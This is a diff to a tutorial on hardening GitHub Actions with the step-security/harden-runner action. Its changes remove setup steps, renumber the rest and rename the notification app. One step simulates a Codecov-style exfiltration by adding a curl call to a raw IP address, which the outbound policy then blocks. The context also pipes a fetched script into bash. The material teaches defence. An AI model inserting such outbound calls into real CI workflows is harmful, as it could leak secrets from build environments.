@@ -6,13 +6,7 @@ For examples of real-world incidents in which credentials have been exfiltrated 
 
 In this tutorial, you will use the step-security/harden-runner GitHub Action to audit and filter network traffic to prevent credential exfiltration.
 
-1. Create a fork of the repo.
-
-2. Go to the `Actions` tab in the fork. Click the `I understand my workflows, go ahead and enable them` button.
-
-   <img src="../images/EnableActions.png" alt="Enable Actions" width="800">
-
-3. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the [ci.yml](../.github/workflows/ci.yml) file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step. Commit the changes to `main` branch.
+1. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the [ci.yml](../.github/workflows/ci.yml) file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step. Commit the changes to `main` branch.
 
    ```yaml
    - uses: step-security/harden-runner@v2
@@ -48,15 +42,15 @@ In this tutorial, you will use the step-security/harden-runner GitHub Action to 
              bash <(curl -s https://codecov.io/bash)
    ```
 
-4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab to view the workflow run.
+2. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab to view the workflow run.
 
-5. You should see a link to security insights and recommendations for the workflow run.
+3. You should see a link to security insights and recommendations for the workflow run.
 
 <img src="../images/InsightsLink.png" alt="Link to security insights" width="800">
 
-6. Click on the link. You should see outbound traffic correlated with each step of the workflow. An outbound network policy would be recommended.
+4. Click on the link. You should see outbound traffic correlated with each step of the workflow. An outbound network policy would be recommended.
 
-7. Update the [ci.yml](../.github/workflows/ci.yml) workflow with the policy. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow.
+5. Update the [ci.yml](../.github/workflows/ci.yml) workflow with the policy. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow.
 
    ```yaml
    - uses: step-security/harden-runner@v2
@@ -98,7 +92,7 @@ In this tutorial, you will use the step-security/harden-runner GitHub Action to 
              bash <(curl -s https://codecov.io/bash)
    ```
 
-8. Simulate an exfiltration attack similar to Codecov. Update the workflow and add the following statement. The bash uploader is no longer vulnerable, but when it was, it would have made an additional outbound call, which is being simulated here.
+6. Simulate an exfiltration attack similar to Codecov. Update the workflow and add the following statement. The bash uploader is no longer vulnerable, but when it was, it would have made an additional outbound call, which is being simulated here.
 
    ```yaml
    - name: Upload coverage to Codecov
@@ -139,11 +133,11 @@ In this tutorial, you will use the step-security/harden-runner GitHub Action to 
              curl -X GET http://104.248.94.23
    ```
 
-9. This change should cause the workflow to run, as it is set to run on push. Observe that the workflow fails because the call is blocked. Click the link to security insights. You can see that blocked calls are shown in Red color in the insights page.
+7. This change should cause the workflow to run, as it is set to run on push. Observe that the workflow fails because the call is blocked. Click the link to security insights. You can see that blocked calls are shown in Red color in the insights page.
 
    <img src="../images/RestrictOutboundTraffic.png" alt="Blocked calls are shown in Red" width="800">
 
-10. Install the [Harden Runner App](https://github.com/marketplace/harden-runner-app) to get notified via email or Slack when outbound traffic is blocked.
+8. Install the [StepSecurity Actions Security GitHub App](https://github.com/apps/stepsecurity-actions-security) to get notified via email or Slack when outbound traffic is blocked.
 
 ## Using Harden Runner with ARC (Actions Runner Controller) for Auditing Outbound Traffic
 
@@ -157,6 +151,6 @@ For a demo of a workflow running on a Kubernetes self-hosted runner with Harden 
 
 Security insights for ARC-based self-hosted runners can be found under the Runtime Security tab in the dashboard at [app.stepsecurity.io](#) (to be updated).
 
-Remember, to utilize Harden Runner with ARC-based self-hosted runners and enforce outbound traffic auditing, it is necessary to install the [Harden Runner App](https://github.com/marketplace/harden-runner-app).
+Remember, to utilize Harden Runner with ARC-based self-hosted runners and enforce outbound traffic auditing, it is necessary to install the [StepSecurity Actions Security GitHub App](https://github.com/apps/stepsecurity-actions-security).
 
 It's important to note that while the feature to restrict outbound traffic is not yet available for ARC-based self-hosted runners, it is currently in development and is expected to be released in a few weeks.
